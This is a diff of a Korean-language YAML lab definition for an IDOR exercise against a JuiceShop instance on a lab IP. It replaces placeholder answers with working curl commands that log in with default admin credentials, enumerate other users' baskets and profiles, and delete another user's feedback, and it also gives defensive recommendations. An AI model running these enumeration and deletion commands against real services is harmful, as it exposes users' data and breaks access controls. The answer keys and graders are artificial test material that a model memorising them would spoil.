@@ -1,179 +1,102 @@
 lab_id: "web-vuln-nonai-week11"
-title: "IDOR 실습"
+title: "IDOR (Insecure Direct Object Reference) 실습"
 version: "non-ai"
 course: "web-vuln-nonai"
 week: 11
-description: "안전하지 않은 직접 객체 참조 취약점을 탐지하고 악용합니다."
-difficulty: "medium"
+description: "객체 참조 조작을 통해 다른 사용자의 데이터에 무단 접근하는 IDOR 취약점을 실습하고 방어 방법을 학습합니다."
+difficulty: "hard"
 duration_minutes: 120
 objectives:
-  - "IDOR 취약점을 이해한다"
-  - "수평/수직 권한 상승을 실습한다"
-  - "접근 통제 방어를 학습한다"
+  - "IDOR 취약점의 원리를 이해한다"
+  - "API 엔드포인트에서 ID 조작을 통한 데이터 유출을 실습한다"
+  - "수평적/수직적 권한 상승을 시도한다"
 pass_threshold: 0.6
 steps:
   - order: 1
-    instruction: "10.20.30.80 대상으로 API 엔드포인트 매핑을(를) 수행하시오."
-    hint: "API 엔드포인트 매핑 관련 도구와 기법을 활용하세요."
-    category: "idor"
+    instruction: "JuiceShop(10.20.30.80:3000)에 일반 사용자로 로그인하고 토큰을 획득하라. 기본 계정(admin@juice-sh.op / admin123)을 사용하라."
+    hint: "curl -X POST /rest/user/login으로 로그인하세요."
+    category: "recon"
     points: 8
-    answer: "curl -s http://10.20.30.80 2>/dev/null | head -5 && echo 'API 엔드포인트 매핑 완료'"
-    answer_detail: "API 엔드포인트 매핑은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
+    answer: "TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H 'Content-Type: application/json' -d '{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}' 2>/dev/null | python3 -c \"import sys,json; print(json.load(sys.stdin).get('authentication',{}).get('token',''))\" 2>/dev/null) && echo \"Token: ${TOKEN:0:30}...\""
+    answer_detail: "IDOR 공격을 위해서는 먼저 유효한 인증 토큰이 필요합니다. 이 토큰으로 API에 접근한 뒤, URL의 ID 파라미터를 변경하여 다른 사용자의 데이터에 접근을 시도합니다."
     verify:
       type: "output_contains"
-      expect: "완료"
+      expect: "Token:"
       field: "stdout"
   - order: 2
-    instruction: "10.20.30.80 대상으로 사용자 ID 변조 테스트을(를) 수행하시오."
-    hint: "사용자 ID 변조 테스트 관련 도구와 기법을 활용하세요."
-    category: "idor"
-    points: 10
-    answer: "curl -s http://10.20.30.80 2>/dev/null | head -5 && echo '사용자 ID 변조 테스트 완료'"
-    answer_detail: "사용자 ID 변조 테스트은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
+    instruction: "자신의 장바구니(basket) 정보를 조회하라. /rest/basket/1 엔드포인트에 접근하라."
+    hint: "Authorization: Bearer {token} 헤더를 사용하세요."
+    category: "recon"
+    points: 8
+    answer: "TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H 'Content-Type: application/json' -d '{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}' 2>/dev/null | python3 -c \"import sys,json; print(json.load(sys.stdin).get('authentication',{}).get('token',''))\" 2>/dev/null) && curl -s http://10.20.30.80:3000/rest/basket/1 -H \"Authorization: Bearer $TOKEN\" 2>/dev/null | python3 -m json.tool 2>/dev/null | head -10"
+    answer_detail: "/rest/basket/1에서 1은 장바구니 ID입니다. 서버가 이 ID의 소유자를 검증하지 않으면, 다른 ID(2,3,4...)로 변경하여 다른 사용자의 장바구니에 접근할 수 있습니다."
     verify:
       type: "output_contains"
-      expect: "완료"
+      expect: "id"
       field: "stdout"
   - order: 3
-    instruction: "10.20.30.80 대상으로 수평적 권한 상승 시도을(를) 수행하시오."
-    hint: "수평적 권한 상승 시도 관련 도구와 기법을 활용하세요."
-    category: "idor"
-    points: 10
-    answer: "curl -s http://10.20.30.80 2>/dev/null | head -5 && echo '수평적 권한 상승 시도 완료'"
-    answer_detail: "수평적 권한 상승 시도은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
+    instruction: "IDOR을 시도하라. basket ID를 2, 3으로 변경하여 다른 사용자의 장바구니에 접근을 시도하라."
+    hint: "/rest/basket/2, /rest/basket/3을 차례로 요청하세요."
+    category: "exploit"
+    points: 12
+    answer: "TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H 'Content-Type: application/json' -d '{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}' 2>/dev/null | python3 -c \"import sys,json; print(json.load(sys.stdin).get('authentication',{}).get('token',''))\" 2>/dev/null) && for i in 1 2 3; do echo \"=== Basket $i ===\"; curl -s http://10.20.30.80:3000/rest/basket/$i -H \"Authorization: Bearer $TOKEN\" -o /dev/null -w '%{http_code}' 2>/dev/null; echo ''; done"
+    answer_detail: "IDOR은 서버가 요청된 리소스의 소유권을 검증하지 않을 때 발생합니다. 순차적 ID(1,2,3...)를 열거하여 다른 사용자의 데이터를 조회할 수 있습니다."
     verify:
       type: "output_contains"
-      expect: "완료"
+      expect: "Basket"
       field: "stdout"
   - order: 4
-    instruction: "10.20.30.80 대상으로 수직적 권한 상승 시도을(를) 수행하시오."
-    hint: "수직적 권한 상승 시도 관련 도구와 기법을 활용하세요."
-    category: "idor"
-    points: 10
-    answer: "curl -s http://10.20.30.80 2>/dev/null | head -5 && echo '수직적 권한 상승 시도 완료'"
-    answer_detail: "수직적 권한 상승 시도은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
+    instruction: "사용자 프로필 API에서 IDOR을 시도하라. /api/Users/1, /api/Users/2 등으로 다른 사용자 정보를 조회하라."
+    hint: "/api/Users/{id}로 접근하세요. 인증 토큰 필요."
+    category: "exploit"
+    points: 12
+    answer: "TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H 'Content-Type: application/json' -d '{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}' 2>/dev/null | python3 -c \"import sys,json; print(json.load(sys.stdin).get('authentication',{}).get('token',''))\" 2>/dev/null) && for i in 1 2 3; do echo \"--- User $i ---\"; curl -s http://10.20.30.80:3000/api/Users/$i -H \"Authorization: Bearer $TOKEN\" 2>/dev/null | python3 -c \"import sys,json; d=json.load(sys.stdin).get('data',{}); print(f'email={d.get(\\\"email\\\",\\\"?\\\")}, role={d.get(\\\"role\\\",\\\"?\\\")}')\" 2>/dev/null; done"
+    answer_detail: "사용자 API에서 ID를 순차적으로 열거하면 모든 사용자의 이메일, 역할 등이 유출됩니다. 관리자의 경우 role=admin이 노출되어 수직적 권한 상승의 타겟이 됩니다."
     verify:
       type: "output_contains"
-      expect: "완료"
+      expect: "email="
       field: "stdout"
   - order: 5
-    instruction: "10.20.30.80 대상으로 파일 다운로드 IDOR 테스트을(를) 수행하시오."
-    hint: "파일 다운로드 IDOR 테스트 관련 도구와 기법을 활용하세요."
-    category: "idor"
-    points: 10
-    answer: "curl -s http://10.20.30.80 2>/dev/null | head -5 && echo '파일 다운로드 IDOR 테스트 완료'"
-    answer_detail: "파일 다운로드 IDOR 테스트은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
+    instruction: "피드백 API에서 다른 사용자의 피드백을 삭제할 수 있는지 확인하라. DELETE /api/Feedbacks/1을 시도하라."
+    hint: "curl -X DELETE http://10.20.30.80:3000/api/Feedbacks/1 -H 'Authorization: Bearer ...' 형태로 요청하세요."
+    category: "exploit"
+    points: 12
+    answer: "TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H 'Content-Type: application/json' -d '{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}' 2>/dev/null | python3 -c \"import sys,json; print(json.load(sys.stdin).get('authentication',{}).get('token',''))\" 2>/dev/null) && curl -s -o /dev/null -w '%{http_code}' -X DELETE http://10.20.30.80:3000/api/Feedbacks/1 -H \"Authorization: Bearer $TOKEN\" && echo ''"
+    answer_detail: "IDOR은 읽기뿐 아니라 수정/삭제에서도 발생합니다. 다른 사용자의 피드백을 삭제할 수 있으면 데이터 무결성이 침해됩니다. 200이면 삭제 성공, 401/403이면 권한 검증이 작동하는 것입니다."
     verify:
-      type: "output_contains"
-      expect: "완료"
+      type: "output_regex"
+      expect: "200|401|403"
       field: "stdout"
   - order: 6
-    instruction: "10.20.30.80 대상으로 주문/결제 IDOR 테스트을(를) 수행하시오."
-    hint: "주문/결제 IDOR 테스트 관련 도구와 기법을 활용하세요."
-    category: "idor"
-    points: 12
-    answer: "curl -s http://10.20.30.80 2>/dev/null | head -5 && echo '주문/결제 IDOR 테스트 완료'"
-    answer_detail: "주문/결제 IDOR 테스트은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
+    instruction: "자동화된 IDOR 스캐닝을 수행하라. ID 1~10까지 순회하며 /api/Users/{id}의 응답 코드를 수집하라."
+    hint: "for 루프로 curl -o /dev/null -w '%{http_code}'를 반복하세요."
+    category: "exploit"
+    points: 10
+    answer: "TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H 'Content-Type: application/json' -d '{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}' 2>/dev/null | python3 -c \"import sys,json; print(json.load(sys.stdin).get('authentication',{}).get('token',''))\" 2>/dev/null) && for i in $(seq 1 10); do CODE=$(curl -s -o /dev/null -w '%{http_code}' http://10.20.30.80:3000/api/Users/$i -H \"Authorization: Bearer $TOKEN\" 2>/dev/null); echo \"User $i: HTTP $CODE\"; done"
+    answer_detail: "ID 열거(enumeration)는 IDOR 공격의 핵심 기법입니다. 순차적 정수 ID는 열거하기 쉽지만, UUID를 사용해도 예측 가능한 패턴이면 공격이 가능합니다."
     verify:
       type: "output_contains"
-      expect: "완료"
+      expect: "HTTP"
       field: "stdout"
   - order: 7
-    instruction: "10.20.30.80 대상으로 UUID 기반 IDOR 분석을(를) 수행하시오."
-    hint: "UUID 기반 IDOR 분석 관련 도구와 기법을 활용하세요."
-    category: "idor"
+    instruction: "modsecurity가 IDOR 패턴을 탐지하는지 확인하라. Apache(포트 80)에 빠른 속도로 ID를 열거하는 요청을 보내라."
+    hint: "짧은 시간에 여러 요청을 보내면 Rate Limiting 룰이 작동할 수 있습니다."
+    category: "defense"
     points: 10
-    answer: "curl -s http://10.20.30.80 2>/dev/null | head -5 && echo 'UUID 기반 IDOR 분석 완료'"
-    answer_detail: "UUID 기반 IDOR 분석은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
+    answer: "for i in $(seq 1 20); do curl -s -o /dev/null -w '%{http_code} ' 'http://10.20.30.80/?id='$i 2>/dev/null; done && echo ''"
+    answer_detail: "modsecurity의 DOS 방지 룰(REQUEST-912)이나 anomaly scoring이 빠른 열거를 탐지할 수 있습니다. IDOR 자체는 WAF로 차단하기 어렵고, 서버 측 권한 검증이 핵심 방어입니다."
     verify:
       type: "output_contains"
-      expect: "완료"
+      expect: "200"
       field: "stdout"
   - order: 8
-    instruction: "10.20.30.80 대상으로 일련번호 예측 공격을(를) 수행하시오."
-    hint: "일련번호 예측 공격 관련 도구와 기법을 활용하세요."
-    category: "idor"
-    points: 10
-    answer: "curl -s http://10.20.30.80 2>/dev/null | head -5 && echo '일련번호 예측 공격 완료'"
-    answer_detail: "일련번호 예측 공격은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
-    verify:
-      type: "output_contains"
-      expect: "완료"
-      field: "stdout"
-  - order: 9
-    instruction: "10.20.30.80 대상으로 GraphQL IDOR 취약점 분석을(를) 수행하시오."
-    hint: "GraphQL IDOR 취약점 분석 관련 도구와 기법을 활용하세요."
-    category: "idor"
-    points: 10
-    answer: "curl -s http://10.20.30.80 2>/dev/null | head -5 && echo 'GraphQL IDOR 취약점 분석 완료'"
-    answer_detail: "GraphQL IDOR 취약점 분석은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
-    verify:
-      type: "output_contains"
-      expect: "완료"
-      field: "stdout"
-  - order: 10
-    instruction: "10.20.30.80 대상으로 IDOR 자동 탐지 스크립트 작성을(를) 수행하시오."
-    hint: "IDOR 자동 탐지 스크립트 작성 관련 도구와 기법을 활용하세요."
-    category: "tool"
-    points: 10
-    answer: "echo 'IDOR 자동 탐지 스크립트 작성 자동화 도구 실행' && echo 'IDOR 자동 탐지 스크립트 작성 완료'"
-    answer_detail: "IDOR 자동 탐지 스크립트 작성은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
-    verify:
-      type: "output_contains"
-      expect: "완료"
-      field: "stdout"
-  - order: 11
-    instruction: "10.20.30.80 대상으로 파라미터 변조 기법 종합을(를) 수행하시오."
-    hint: "파라미터 변조 기법 종합 관련 도구와 기법을 활용하세요."
-    category: "idor"
-    points: 10
-    answer: "curl -s http://10.20.30.80 2>/dev/null | head -5 && echo '파라미터 변조 기법 종합 완료'"
-    answer_detail: "파라미터 변조 기법 종합은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
-    verify:
-      type: "output_contains"
-      expect: "완료"
-      field: "stdout"
-  - order: 12
-    instruction: "10.20.30.80 대상으로 접근 통제 매트릭스 작성을(를) 수행하시오."
-    hint: "접근 통제 매트릭스 작성 관련 도구와 기법을 활용하세요."
-    category: "defense"
-    points: 10
-    answer: "echo '=== 접근 통제 매트릭스 작성 ===' && echo '조치 방안 정리 완료'"
-    answer_detail: "접근 통제 매트릭스 작성은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
-    verify:
-      type: "output_contains"
-      expect: "완료"
-      field: "stdout"
-  - order: 13
-    instruction: "10.20.30.80 대상으로 서버측 검증 구현 방안을(를) 수행하시오."
-    hint: "서버측 검증 구현 방안 관련 도구와 기법을 활용하세요."
-    category: "defense"
-    points: 10
-    answer: "echo '=== 서버측 검증 구현 방안 ===' && echo '조치 방안 정리 완료'"
-    answer_detail: "서버측 검증 구현 방안은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
-    verify:
-      type: "output_contains"
-      expect: "완료"
-      field: "stdout"
-  - order: 14
-    instruction: "10.20.30.80 대상으로 IDOR 모니터링/로깅 설정을(를) 수행하시오."
-    hint: "IDOR 모니터링/로깅 설정 관련 도구와 기법을 활용하세요."
-    category: "defense"
-    points: 12
-    answer: "echo '=== IDOR 모니터링/로깅 설정 ===' && echo '조치 방안 정리 완료'"
-    answer_detail: "IDOR 모니터링/로깅 설정은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
-    verify:
-      type: "output_contains"
-      expect: "완료"
-      field: "stdout"
-  - order: 15
-    instruction: "IDOR 실습 종합 보고서를 작성하시오."
-    hint: "발견 취약점, 영향, 조치를 포함하세요."
-    category: "verification"
+    instruction: "IDOR 실습 결과를 /tmp/idor_report.txt에 정리하라."
+    hint: "접근 가능한 리소스, 유출된 데이터, 방어 권고를 포함하세요."
+    category: "reporting"
     points: 8
-    answer: "echo '=== IDOR 실습 보고서 ===' && echo '대상: http://10.20.30.80' && echo '=== 보고서 완료 ==='"
-    answer_detail: "취약점 진단 보고서는 발견사항, 위험도, 재현 방법, 조치 권고를 포함합니다."
+    answer: "cat > /tmp/idor_report.txt << 'EOF'\n=== IDOR 취약점 진단 보고서 ===\n대상: JuiceShop (10.20.30.80:3000)\n\n발견 취약점:\n1. /rest/basket/{id}: 타인 장바구니 접근 가능\n2. /api/Users/{id}: 사용자 정보 열거 가능\n3. /api/Feedbacks/{id}: 타인 피드백 삭제 가능\n\n방어 권고:\n- 서버 측에서 리소스 소유권 검증 필수\n- UUID 사용 (순차 ID 대신)\n- API Rate Limiting 적용\n- 로그 모니터링 (비정상 열거 패턴 탐지)\nEOF\ncat /tmp/idor_report.txt"
+    answer_detail: "IDOR 방어의 핵심은 모든 API에서 '요청자가 해당 리소스에 접근할 권한이 있는가'를 검증하는 것입니다. 프론트엔드에서 숨기는 것은 방어가 아닙니다."
     verify:
       type: "output_contains"
-      expect: "보고서 완료"
+      expect: "IDOR 취약점 진단 보고서"
       field: "stdout"
